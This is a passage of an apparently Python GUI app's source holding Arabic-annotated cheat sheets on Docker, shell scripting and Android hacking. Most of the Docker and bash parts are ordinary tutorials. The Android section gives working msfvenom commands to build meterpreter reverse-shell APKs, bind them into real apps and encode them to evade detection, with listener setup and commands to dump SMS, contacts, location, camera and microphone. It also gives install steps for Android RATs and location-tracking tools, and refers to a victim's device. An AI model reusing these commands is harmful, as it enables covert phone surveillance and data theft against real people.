# ============ Dockerfile (ملف بناء الصورة) ============
# مثال Dockerfile لتطبيق Python
\"\"\"
# استخدام صورة أساسية
FROM python:3.9-slim

# تحديد مجلد العمل
WORKDIR /app

# نسخ متطلبات التطبيق
COPY requirements.txt .

# تثبيت المتطلبات
RUN pip install --no-cache-dir -r requirements.txt

# نسخ الكود
COPY . .

# تعريف المنفذ
EXPOSE 5000

# أمر التشغيل
CMD ["python", "app.py"]
\"\"\"

# مثال Dockerfile لتطبيق Node.js
\"\"\"
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["npm", "start"]
\"\"\"

# مثال Dockerfile مع مراحل متعددة (Multi-stage)
\"\"\"
# مرحلة البناء
FROM golang:1.16 AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN go build -o main .

# مرحلة التشغيل (صورة أصغر)
FROM alpine:latest
RUN apk --no-cache add ca-certificates
WORKDIR /root/
COPY --from=builder /app/main .
EXPOSE 8080
CMD ["./main"]
\"\"\"

# ============ Docker Compose (تشغيل عدة حاويات) ============
# مثال docker-compose.yml
\"\"\"
version: '3.8'

services:
  web:
    build: .
    ports:
      - "5000:5000"
    environment:
      - FLASK_ENV=development
    volumes:
      - .:/app
    depends_on:
      - db

  db:
    image: postgres:13
    environment:
      POSTGRES_PASSWORD: secret
      POSTGRES_DB: myapp
    volumes:
      - postgres_data:/var/lib/postgresql/data
    ports:
      - "5432:5432"

  redis:
    image: redis:alpine
    ports:
      - "6379:6379"

volumes:
  postgres_data:
\"\"\"

# أوامر Docker Compose
docker-compose up
docker-compose up -d  # في الخلفية
docker-compose down
docker-compose down -v  # مع حذف الـ volumes
docker-compose logs
docker-compose logs -f
docker-compose ps
docker-compose exec web bash
docker-compose build
docker-compose pull
docker-compose restart

# ============ الشبكات في Docker ============
# عرض الشبكات
docker network ls

# إنشاء شبكة
docker network create mynetwork
docker network create --driver bridge mybridge

# تشغيل حاوية في شبكة معينة
docker run --network mynetwork --name container1 nginx
docker run --network mynetwork --name container2 nginx

# ربط حاوية بشبكة
docker network connect mynetwork container3

# معلومات الشبكة
docker network inspect mynetwork

# ============ الـ Volumes (التخزين الدائم) ============
# إنشاء volume
docker volume create mydata
docker volume ls

# استخدام volume في حاوية
docker run -v mydata:/data nginx
docker run --mount source=mydata,target=/data nginx

# نسخ احتياطي لـ volume
docker run --rm -v mydata:/source -v $(pwd):/backup alpine tar czf /backup/mydata.tar.gz -C /source .

# ============ Docker Registry محلي ============
# تشغيل registry محلي
docker run -d -p 5000:5000 --name registry registry:2

# دفع صورة إلى registry المحلي
docker tag myapp:1.0 localhost:5000/myapp:1.0
docker push localhost:5000/myapp:1.0

# سحب من registry المحلي
docker pull localhost:5000/myapp:1.0

# ============ تنظيف Docker ============
# حذف كل الحاويات المتوقفة
docker container prune

# حذف كل الصور غير المستخدمة
docker image prune
docker image prune -a

# حذف كل الـ volumes غير المستخدمة
docker volume prune

# حذف كل الشبكات غير المستخدمة
docker network prune

# حذف كل شيء غير مستخدم (حاويات، صور، شبكات، volumes)
docker system prune
docker system prune -a --volumes

# ============ Docker Security (الأمان) ============
# تشغيل حاوية بدون صلاحيات الجذر
docker run --user 1000:1000 nginx

# تقييد الموارد
docker run --memory="512m" --cpus="1.5" nginx

# للقراءة فقط
docker run --read-only nginx

# ============ أمثلة عملية ============
# مثال: تشغيل موقع Nginx مع ملفات محلية
mkdir website
echo "<h1>Hello from Docker</h1>" > website/index.html
docker run -d -p 8080:80 -v $(pwd)/website:/usr/share/nginx/html --name mysite nginx

# مثال: تشغيل MySQL
docker run -d \\
  --name mysql-db \\
  -e MYSQL_ROOT_PASSWORD=secret \\
  -e MYSQL_DATABASE=myapp \\
  -p 3306:3306 \\
  -v mysql_data:/var/lib/mysql \\
  mysql:8.0

# مثال: تشغيل تطبيق Python مع Redis
# docker-compose.yml كما في الأعلى
docker-compose up -d
curl http://localhost:5000

# مثال: بناء صورة صغيرة جداً (Alpine)
# Dockerfile.alpine
\"\"\"
FROM alpine:latest
RUN apk add --no-cache python3 py3-pip
WORKDIR /app
COPY app.py .
CMD ["python3", "app.py"]
\"\"\"
docker build -t myapp-alpine -f Dockerfile.alpine .
docker images | grep myapp  # ستلاحظ الفرق في الحجم

# ============ Docker Swarm (التجميع) ============
# تهيئة Swarm
docker swarm init

# نشر خدمة
docker service create --name web -p 80:80 --replicas 3 nginx

# عرض الخدمات
docker service ls
docker service ps web

# تحديث خدمة
docker service update --image nginx:alpine web
docker service scale web=5

# ============ أوامر مفيدة جداً ============
# تنظيف كل شيء (احذر!)
docker system prune -a --volumes

# عرض استخدام الموارد
docker system df

# تشغيل أمر في كل الحاويات
for container in $(docker ps -q); do docker exec $container hostname; done

# حفظ صورة كملف tar
docker save nginx:latest | gzip > nginx.tar.gz

# تحميل صورة من ملف tar
gunzip -c nginx.tar.gz | docker load

# دخول سريع إلى حاوية
alias docker-sh='docker exec -it $(docker ps -lq) sh'""",
                    "verification": """# التحقق من التثبيت والتشغيل
docker version
docker info
docker run hello-world

# التحقق من الحاويات
docker ps
docker ps -a

# التحقق من الصور
docker images

# التحقق من الشبكات
docker network ls

# التحقق من الـ volumes
docker volume ls""",
                    "example": """📌 مثال: تشغيل موقع WordPress كامل
# إنشاء docker-compose.yml
\"\"\"
version: '3.8'
services:
  db:
    image: mysql:5.7
    volumes:
      - db_data:/var/lib/mysql
    restart: always
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wpuser
      MYSQL_PASSWORD: wppass

  wordpress:
    depends_on:
      - db
    image: wordpress:latest
    ports:
      - "8000:80"
    restart: always
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wpuser
      WORDPRESS_DB_PASSWORD: wppass
      WORDPRESS_DB_NAME: wordpress
volumes:
  db_data:
\"\"\"
# تشغيل:
docker-compose up -d
# افتح المتصفح: http://localhost:8000""",
                    "notes": "💡 نصائح مهمة:\n• استخدم .dockerignore لتجنب نسخ الملفات غير الضرورية.\n• اجعل الصور صغيرة باستخدام Alpine Linux.\n• لا تشغل الحاويات كـ root.\n• استخدم volumes للبيانات المهمة.\n• Docker Compose رائع للتطبيقات متعددة الخدمات.\n• تعلم Dockerfile الجيد يوفر وقتاً كبيراً."
                },
                
                "09. Android Hacking & Mobile Security": {
                    "code": """# ============ ANDROID HACKING & MOBILE SECURITY ============

# ============ ADB (Android Debug Bridge) ============
# تثبيت ADB
sudo apt install adb -y

# أوامر ADB الأساسية
adb devices                    # قائمة الأجهزة المتصلة
adb devices -l                 # قائمة مفصلة

# الاتصال بجهاز عبر USB (بعد تفعيل USB Debugging)
adb usb                        # التأكد من وضع USB

# الاتصال عبر Wi-Fi
adb tcpip 5555                 # إعادة تشغيل ADB في وضع TCP على المنفذ 5555
adb connect 192.168.1.7:5555   # الاتصال عبر Wi-Fi
adb disconnect                 # قطع الاتصال

# أوامر ADB متقدمة
adb shell                      # فتح شل على الجهاز
adb shell ip route             # عرض IP الخاص بالجهاز
adb shell pm list packages     # قائمة التطبيقات المثبتة
adb shell dumpsys              # معلومات النظام
adb install app.apk            # تثبيت تطبيق
adb uninstall package.name     # إزالة تطبيق
adb pull /sdcard/file.txt .    # سحب ملف من الجهاز
adb push file.txt /sdcard/     # دفع ملف إلى الجهاز
adb reboot                     # إعادة تشغيل الجهاز
adb logcat                     # عرض سجلات النظام

# ============ SCRCPY (عرض شاشة Android على الكمبيوتر) ============
# تثبيت scrcpy
sudo apt install scrcpy -y

# تشغيل scrcpy
scrcpy                         # عرض الشاشة عبر USB
scrcpy -s 192.168.1.7:5555     # عبر Wi-Fi (بعد adb connect)

# خيارات scrcpy
scrcpy --bit-rate 2M           # تحديد معدل البت
scrcpy --max-size 1024         # تحديد أقصى دقة
scrcpy --fullscreen            # وضع ملء الشاشة
scrcpy --turn-screen-off       # إيقاف شاشة الجهاز
scrcpy --record file.mp4       # تسجيل الشاشة

# ============ METASPLOIT لأندرويد ============
# إنشاء payload لأندرويد
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk

# دمج payload مع تطبيق حقيقي
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x real_app.apk -o merged.apk

# تشغيل مستمع Metasploit
msfconsole -q
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit

# أوامر Meterpreter لأندرويد
# بعد الحصول على جلسة:
sysinfo                        # معلومات الجهاز
dump_sms                       # سحب رسائل SMS
geolocate                      # تحديد الموقع
webcam_snap                    # التقاط صورة
record_mic                     # تسجيل صوت
dump_contacts                  # سحب جهات الاتصال
send_sms -d NUMBER -t "text"   # إرسال SMS

# ============ AhMyth (Android RAT) ============
# تثبيت AhMyth
git clone https://github.com/AhMyth/AhMyth-Android-RAT.git
cd AhMyth/AhMyth-Server

# تثبيت المتطلبات
sudo apt update
sudo apt install git nodejs npm -y

# تثبيت الحزم
npm install

# تشغيل AhMyth
npm start -- --no-sandbox --disable-gpu

# مسار الإخراج
cd ~/AhMyth/Output/

# ============ Evil-Droid ============
# تثبيت Evil-Droid
git clone https://github.com/M4sc3r4n0/Evil-Droid.git
cd Evil-Droid
chmod +x evil-droid
sudo ./evil-droid

# ============ APKTool ============
# تثبيت APKTool
sudo apt install apktool -y

# فك تجميع APK
apktool d app.apk

# إعادة بناء APK بعد التعديل
apktool b app_folder -o modified.apk

# نقل إلى المسار العام
sudo mv apktool /usr/local/bin/
sudo chmod +x /usr/local/bin/apktool

# ============ توقيع APK ============
# إنشاء مفتاح توقيع
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

# توقيع APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore app.apk alias_name

# التحقق من التوقيع
jarsigner -verify -verbose -certs app.apk

# ============ PhoneSploit Pro ============
# تثبيت PhoneSploit Pro
git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro.git
cd PhoneSploit-Pro/

# إعداد البيئة الافتراضية
sudo apt update
sudo apt install python3-venv python3-pip -y
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# تشغيل PhoneSploit Pro
python3 phonesploitpro.py

# ============ CiLocks (كسر شاشة القفل) ============
# تثبيت CiLocks
git clone https://github.com/tegal1337/CiLocks.git
cd CiLocks
chmod +x cilocks
sudo bash cilocks

# ============ Seeker (تحديد الموقع) ============
# تثبيت Seeker
git clone https://github.com/thewhiteh4t/seeker.git
cd seeker/
chmod +x install.sh
./install.sh

# تشغيل Seeker
python3 seeker.py -h

# ============ Hound (تحديد الموقع) ============
# تثبيت Hound
git clone https://github.com/techchipnet/hound.git
cd hound
chmod +x hound.sh
sudo ./hound.sh

# ============ Casper (سرقة الملفات عبر Telegram) ============
# إنشاء بوت في تليجرام
# @BotFather لإنشاء بوت والحصول على التوكن

# API للتحقق من الرسائل
# https://api.telegram.org/bot<your_bot_token>/getUpdates

# ============ STORM BREAKER (تحديد الموقع) ============
git clone https://github.com/ultrasecurity/Storm-Breaker.git
cd Storm-Breaker
chmod +x install.sh
sudo ./install.sh

# تشغيل Storm-Breaker
source stormbreaker-venv/bin/activate
python3 st.py

# ============ Ngrok (لجعل السيرفر المحلي عاماً) ============
# تثبيت ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin

# إضافة التوكن (من https://dashboard.ngrok.com)
ngrok config add-authtoken YOUR_TOKEN

# فتح نفق لمنفذ محلي
ngrok http 8000
ngrok http 2525

# ============ playit.gg (بديل ngrok) ============
# تثبيت playit
curl -SsL https://playit-cloud.github.io/ppa/key.gpg | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/playit.gpg >/dev/null
echo "deb [signed-by=/etc/apt/trusted.gpg.d/playit.gpg] https://playit-cloud.github.io/ppa/data ./" | sudo tee /etc/apt/sources.list.d/playit-cloud.list
sudo apt update
sudo apt install playit

# تشغيل playit
playit

# ============ استخراج بيانات الصور (EXIF) ============
# exiftool
sudo apt install libimage-exiftool-perl -y
exiftool image.jpg

# exif
sudo apt install exif -y
exif image.jpg

# ============ QR Code Tools ============
# إنشاء QR
sudo apt install qrencode -y
qrencode -o qr.png "https://example.com"

# قراءة QR
sudo apt install zbar-tools -y
zbarimg qr.png

# ============ Webhook.site (HTTP server للاختبار) ============
# https://webhook.site/ - موقع لاستقبال webhooks

# ============ Apache Server لنقل الملفات ============
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2

# نقل الملفات إلى مجلد الويب
sudo mv file.apk /var/www/html/
# الوصول: http://your-ip/file.apk

# ============ مشاكل Android في Metasploit ============
# أسباب فشل الجلسة:
# 1. نوع البايلود غير صحيح (يجب استخدام android/meterpreter/...)
# 2. التطبيق غير موقع
# 3. صلاحيات التطبيق
# 4. إصدار Android حديث (لديه حماية أكبر)

# حلول:
# 1. تأكد من استخدام البايلود الصحيح
set PAYLOAD android/meterpreter/reverse_tcp

# 2. وقع التطبيق كما هو موضح أعلاه
# 3. استخدم reverse_https بدلاً من reverse_tcp
msfvenom -p android/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=4444 -o payload.apk

# 4. استخدم تشفير لتجنب الاكتشاف
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -o encoded.apk""",
                    "verification": """# التحقق من الأدوات
adb --version
scrcpy --version
apktool --version
msfvenom --help
ngrok --version""",
                    "example": """📌 مثال: التحكم بجهاز Android عبر ADB Wi-Fi
1. وصل الجهاز بـ USB مع تفعيل USB Debugging
2. adb devices (للتأكد من الاتصال)
3. adb tcpip 5555
4. افصل USB
5. adb connect 192.168.1.7:5555
6. scrcpy -s 192.168.1.7:5555

📌 مثال: إنشاء backdoor لأندرويد
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o backdoor.apk
# ثم شغل المستمع في msfconsole كما هو موضح""",
                    "notes": "⚠️ تنبيهات مهمة لأندرويد:\n• معظم الأدوات تعمل فقط على الإصدارات القديمة من أندرويد\n• أندرويد 10+ لديه حماية أكبر ضد هذه الأدوات\n• تأكد من توقيع APK قبل التثبيت\n• تفعيل 'مصادر غير معروفة' على جهاز الضحية\n• استخدم reverse_https لتجاوز بعض الجدران النارية\n• للتعلم، استخدم أجهزة افتراضية أو أجهزة قديمة"
                },
                
                "10. 🔧 Advanced Shell Scripting (برمجة الشل المتقدمة)": {
                    "code": """# ============ ADVANCED SHELL SCRIPTING ============
# برمجة نصوص bash المتقدمة

# ============ 1. BASICS & SHEBANG ============
#!/bin/bash
# أو
#!/usr/bin/env bash

# تعليق سطر واحد
: '
هذا تعليق
متعدد الأسطر
'

# ============ 2. VARIABLES & ARRAYS ============
# متغيرات بسيطة
name="Ahmed"
age=25
echo "My name is $name and I am $age years old"
echo "My name is ${name} and I am ${age}"

# متغيرات readonly
readonly PI=3.14159

# متغيرات محلية في الدوال
myfunc() {
    local local_var="هذا متغير محلي"
    echo $local_var
}

# مصفوفات
fruits=("Apple" "Banana" "Orange")
echo ${fruits[0]}  # Apple
echo ${fruits[@]}  # كل العناصر
echo ${#fruits[@]}  # عدد العناصر
fruits+=("Grape")  # إضافة عنصر

# مصفوفة ترابطية (Associative array)
declare -A user
user[name]="Ahmed"
user[age]=25
user[city]="Cairo"
echo ${user[name]}

# ============ 3. INPUT & OUTPUT ============
# قراءة إدخال
read -p "Enter your name: " username
read -s -p "Enter password: " password  # مخفي
read -t 5 -p "Enter in 5 seconds: " input  # timeout

# التحقق من وجود إدخال
if [ -z "$username" ]; then
    echo "No input provided"
fi

# الإخراج بألوان
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
NC='\\033[0m' # No Color

echo -e "${RED}خطأ${NC}: هذا رسالة خطأ"
echo -e "${GREEN}نجاح${NC}: تمت العملية"
echo -e "${YELLOW}تحذير${NC}: انتبه!"

# ============ 4. CONDITIONALS (الشروط) ============
# if statement
if [ "$age" -gt 18 ]; then
    echo "بالغ"
elif [ "$age" -eq 18 ]; then
    echo "بالغ حديثاً"
else
    echo "قاصر"
fi

# اختبارات الملفات
if [ -f "$file" ]; then
    echo "ملف عادي"
fi

if [ -d "$dir" ]; then
    echo "مجلد"
fi

if [ -x "$script" ]; then
    echo "قابل للتنفيذ"
fi

if [ -w "$file" ]; then
    echo "قابل للكتابة"
fi

if [ -s "$file" ]; then
    echo "ملف غير فارغ"
fi

# اختبارات النصوص
if [ -z "$str" ]; then
    echo "نص فارغ"
fi

if [ -n "$str" ]; then
    echo "نص غير فارغ"
fi

# مقارنات
if [ "$str1" = "$str2" ]; then
    echo "متساويان"
fi

if [ "$str1" != "$str2" ]; then
    echo "مختلفان"
fi

if [[ "$str" == *"pattern"* ]]; then
    echo "يحتوي على pattern"
fi

if [[ "$str" =~ ^[0-9]+$ ]]; then
    echo "أرقام فقط"
fi

# عمليات منطقية
if [ "$age" -gt 18 ] && [ "$country" = "Egypt" ]; then
    echo "مصري بالغ"
fi

if [ "$age" -lt 18 ] || [ "$age" -gt 60 ]; then
    echo "طفل أو كبير سن"
fi

# case statement
case "$day" in
    "Saturday"|"Sunday")
        echo "عطلة نهاية الأسبوع"
        ;;
    "Friday")
        echo "الجمعة"
        ;;
    *)
        echo "يوم عادي"
        ;;
esac

# ============ 5. LOOPS (الحلقات) ============
# for loop
for i in 1 2 3 4 5; do
    echo "Number: $i"
done

# for مع نطاق
for i in {1..10}; do
    echo $i
done

# for مع خطوة
for i in {1..10..2}; do
    echo $i
done  # 1,3,5,7,9

# for مع مصفوفة
fruits=("Apple" "Banana" "Orange")
for fruit in "${fruits[@]}"; do
    echo $fruit
done

# for مثل C
for ((i=0; i<10; i++)); do
    echo $i
done

# while loop
count=1
while [ $count -le 10 ]; do
    echo $count
    ((count++))
done

# قراءة ملف سطراً سطراً
while IFS= read -r line; do
    echo "Line: $line"
done < file.txt

# until loop
until [ $count -gt 10 ]; do
    echo $count
    ((count++))
done

# التحكم في الحلقات
for i in {1..10}; do
    if [ $i -eq 5 ]; then
        break  # يخرج من الحلقة
    fi
    if [ $i -eq 3 ]; then
        continue  # يتخطى التكرار الحالي
    fi
    echo $i
done

# ============ 6. FUNCTIONS (الدوال) ============
# تعريف دالة
function greet() {
    echo "Hello, $1!"
}

greet "Ahmed"

# دالة ترجع قيمة
function add() {
    local result=$(( $1 + $2 ))
    echo $result
    return 0
}

sum=$(add 5 3)
echo "Sum: $sum"

# دالة مع خيارات
function log() {
    local level=$1
    shift
    local message="$@"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $message"
}

log "INFO" "System started"
log "ERROR" "Disk full"

# ============ 7. STRING MANIPULATION ============
str="Hello World"

# الطول
echo ${#str}

# استخراج جزء
echo ${str:0:5}  # Hello
echo ${str:6}    # World
echo ${str: -5}  # World (آخر 5)

# استبدال
echo ${str/World/Bash}  # Hello Bash
echo ${str//o/O}        # HellO WOrld (كل الحروف)

# حذف
echo ${str#Hello }  # World
echo ${str% World}  # Hello

# تحويل حالة
echo ${str^^}  # HELLO WORLD
echo ${str,,}  # hello world

# ============ 8. ARITHMETIC (العمليات الحسابية) ============
# عمليات حسابية
a=10
b=3
echo $(( a + b ))  # جمع
echo $(( a - b ))  # طرح
echo $(( a * b ))  # ضرب
echo $(( a / b ))  # قسمة صحيحة
echo $(( a % b ))  # باقي القسمة
echo $(( a ** 2 ))  # أس

# باستخدام let
let result=a*b
echo $result

# باستخدام expr (قديم)
result=$(expr $a + $b)

# عمليات مع bc (للأعداد العشرية)
echo "scale=2; $a / $b" | bc  # 3.33

# ============ 9. ARRAYS & ASSOCIATIVE ARRAYS ============
# مصفوفة بسيطة
arr=(1 2 3 4 5)
echo ${arr[@]}  # كل العناصر
echo ${!arr[@]}  # المؤشرات (indices)
echo ${#arr[@]}  # الطول

# مصفوفة ترابطية
declare -A user=(
    [name]="Ahmed"
    [age]=25
    [city]="Cairo"
)

for key in "${!user[@]}"; do
    echo "$key: ${user[$key]}"
done

# ============ 10. ERROR HANDLING (معالجة الأخطاء) ============
# الخروج مع رمز خطأ
if [ ! -f "$file" ]; then
    echo "Error: File not found"
    exit 1
fi

# trap (التقاط الإشارات)
cleanup() {
    echo "Cleaning up..."
    rm -f /tmp/tempfile
    exit
}

trap cleanup SIGINT SIGTERM

# set options
set -e  # يخرج عند أي خطأ
set -u  # خطأ عند استخدام متغير غير معرف
set -x  # يطبع كل أمر قبل تنفيذه
set -o pipefail  # يفشل إذا فشل أي أمر في pipe

# أو كلهم معاً
set -euo pipefail

# التحقق من نجاح الأمر
if command; then
    echo "Success"
else
    echo "Failed with exit code $?"
fi

# ============ 11. REGULAR EXPRESSIONS (التعبيرات المنتظمة) ============
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$ ]]; then
    echo "بريد إلكتروني صحيح"
fi

if [[ "$ip" =~ ^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$ ]]; then
    echo "IP صحيح"
fi

# ============ 12. WORKING WITH FILES ============
# قراءة ملف
while IFS= read -r line; do
    echo $line
done < input.txt

# كتابة إلى ملف
echo "Hello" > output.txt  # استبدال
echo "World" >> output.txt  # إضافة

# استخدام here document
cat << EOF > config.txt
user=ahmed
password=secret
host=localhost
EOF

# استخدام here string
grep "error" <<< "$log"

# معالجة CSV
while IFS=',' read -r name age city; do
    echo "Name: $name, Age: $age, City: $city"
done < data.csv

# ============ 13. PROCESS SUBSTITUTION ============
# مقارنة مخرجات أمرين
diff <(ls dir1) <(ls dir2)

# تمرير مخرجات أمر كملف
while read line; do
    echo $line
done < <(grep "error" /var/log/syslog)

# ============ 14. ADVANCED EXAMPLES ============
# مثال: برنامج لمراقبة الخدمات
#!/bin/bash

check_service() {
    local service=$1
    if systemctl is-active --quiet "$service"; then
        echo "✅ $service is running"
        return 0
    else
        echo "❌ $service is not running"
        return 1
    fi
}

services=("nginx" "mysql" "ssh")
for svc in "${services[@]}"; do
    check_service "$svc" || echo "Attempting to start $svc..." && sudo systemctl start "$svc"
done

# مثال: نسخ احتياطي مع ضغط
#!/bin/bash

backup_dir="/backup/$(date +%Y%m%d)"
mkdir -p "$backup_dir"

for dir in /home /etc /var/www; do
    if [ -d "$dir" ]; then
        filename=$(basename "$dir")
        tar -czf "$backup_dir/$filename.tar.gz" "$dir"
        echo "✅ Backed up $dir"
    fi
done

# مثال: تحميل متوازي
#!/bin/bash

download_file() {
    url=$1
    wget -q "$url" &
}

urls=(
    "https://example.com/file1.zip"
    "https://example.com/file2.zip"
    "https://example.com/file3.zip"
)

for url in "${urls[@]}"; do
    download_file "$url"
done

wait  # انتظار انتهاء كل المهام
echo "All downloads completed"

# مثال: إنشاء تقرير نظام
#!/bin/bash

report_file="system_report_$(date +%Y%m%d_%H%M%S).txt"

{
    echo "=== SYSTEM REPORT ==="
    echo "Date: $(date)"
    echo "Hostname: $(hostname)"
    echo "Uptime: $(uptime)"
    echo
    echo "=== DISK USAGE ==="
    df -h
    echo
    echo "=== MEMORY ==="
    free -h
    echo
    echo "=== TOP PROCESSES ==="
    ps aux --sort=-%cpu | head -10
} > "$report_file"

echo "Report saved to $report_file"

# مثال: برنامج تفاعلي مع قائمة
#!/bin/bash

while true; do
    clear
    echo "=== MAIN MENU ==="
    echo "1. Show date"
    echo "2. Show disk usage"
    echo "3. Show memory"
    echo "4. Exit"
    read -p "Choice: " choice

    case $choice in
        1) date ;;
        2) df -h ;;
        3) free -h ;;
        4) exit 0 ;;
        *) echo "Invalid choice" ;;
    esac
    read -p "Press enter to continue..."
done

# مثال: معالجة JSON باستخدام jq
data='{"name": "Ahmed", "age": 25}'
echo "$data" | jq '.name'  # "Ahmed"
echo "$data" | jq -r '.name'  # Ahmed (بدون علامات اقتباس)

# مثال: معالجة YAML باستخدام yq
# sudo apt install yq
name=$(yq '.name' config.yaml)""",
                    "verification": """# التحقق من صحة السكربت
bash -n script.sh
shellcheck script.sh  # تحليل متقدم (sudo apt install shellcheck)

# تشغيل مع تتبع
bash -x script.sh
bash -v script.sh""",
                    "example": """📌 مثال: سكربت متكامل لإدارة المستخدمين
#!/bin/bash

USER_FILE="users.txt"
LOG_FILE="user_management.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

create_user() {
    local username=$1
    if id "$username" &>/dev/null; then
        log "User $username already exists"
        return 1
    fi
    
    useradd -m -s /bin/bash "$username"
    if [ $? -eq 0 ]; then
        log "User $username created successfully"
        echo "$username:$(openssl rand -base64 12)" | chpasswd
        log "Password set for $username"
    else
        log "Failed to create user $username"
        return 1
    fi
}

delete_user() {
    local username=$1
    if ! id "$username" &>/dev/null; then
        log "User $username does not exist"
        return 1
    fi
    
    userdel -r "$username" 2>/dev/null
    if [ $? -eq 0 ]; then
        log "User $username deleted"
    else
        log "Failed to delete user $username"
    fi
}

list_users() {
    echo "=== System Users ==="
    awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd
}

case $1 in
    create)
        shift
        for user in "$@"; do
            create_user "$user"
        done
        ;;
    delete)
        shift
        for user in "$@"; do
            delete_user "$user"
        done
        ;;
    list)
        list_users
        ;;
    *)
        echo "Usage: $0 {create|delete|list} [users...]"
        ;;
esac

# استخدام:
# ./user_manager.sh create ahmed mohamed
# ./user_manager.sh list
# ./user_manager.sh delete ahmed""",
                    "notes": "💡 نصائح لبرمجة الشل:\n• استخدم shellcheck لتحسين السكربتات.\n• ضع set -euo pipefail في بداية السكربتات المهمة.\n• استخدم دوال لتكرار الكود.\n• سجل الأخطاء في ملف log.\n• تحقق من وجود الأدوات قبل استخدامها.\n• استخدم [[ ]] بدلاً من [ ] لمزايا إضافية."
                }
            }
        }

if __name__ == "__main__":
    app = CiscoUnifiedCommander()
    app.mainloop()